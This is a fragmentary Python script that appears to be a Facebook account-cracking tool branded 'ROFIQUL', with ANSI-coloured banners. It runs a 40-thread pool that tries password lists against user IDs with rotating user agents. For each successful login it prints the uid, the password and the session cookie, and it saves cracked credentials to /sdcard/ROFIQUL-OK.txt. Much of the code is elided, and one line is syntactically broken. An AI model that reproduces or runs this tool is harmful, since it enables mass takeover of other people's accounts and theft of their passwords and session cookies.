...
for ua in range(10000):
	...
	ugen.append(alhhaj)
os.system("xdg-open https://github.com/Rofiqul10")
logo =("""                        \033[1;31m    


  _____   ____  ______ _____ ____  _    _ _      
 |  __ \ / __ \|  ____|_   _/ __ \| |  | | |     
 | |__) | |  | | |__    | || |  | | |  | | |     
 |  _  /| |  | |  __|   | || |  | | |  | | |     
 | | \ \| |__| | |     _| || |__| | |__| | |____ 
 |_|  \_\\____/|_|    |_____\___\_\\____/|______|
                                                                                                                                                                                         
\033[1;39m     \033[38;5;46mBCS\033[1;39m
\033[1;39m      \x1b[1;95m[]\x1b[1;96m\033[1;34m        : [] ROFIQUL       
\033[1;39m      \x1b[1;95m[]\x1b[1;96m\033[1;34m    : [] NOBAB 
\033[1;39m      \x1b[1;95m[]\x1b[1;96m\033[1;34m      : [] ROFIQUL 
...
def Jaber():
    os.system('clear')
    os.system('xdg-open https://facebook.com/groups/3585208328392622/
    print(logo)
    print("")
    print("\033[1;96m ���������������������������������ͻ")
...
def Jabers():
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;91m�\033[1;92m MACK BY ROFIQUL ')
        print("\033[1;91m�������������������������������������ͼ")
        for love in user:
    ...
    print(' \033[1;91m[\033[1;92m\033[1;91m]\033[1;92m HI IM ROFIQUL ')
    print("\033[1;91m���������������������������ͼ")
...
def Jaberm(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;91m[\033[1;92m ROFIQUL \033[1;91m][\033[1;92m%s\033[1;91m][\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
...
pro}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'\033[1;96m[\033[1;92mROFIQUL-BD\033[1;96m]\033[1;92m '+uid+' \033[1;96m\033[1;92m '+ps+'')
                print(f'\033[1;36m : \033[1;35m'+coki)
                open('/sdcard/ROFIQUL-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;90m[ROFIQUL-] '+uid+'  '+ps+' \n')
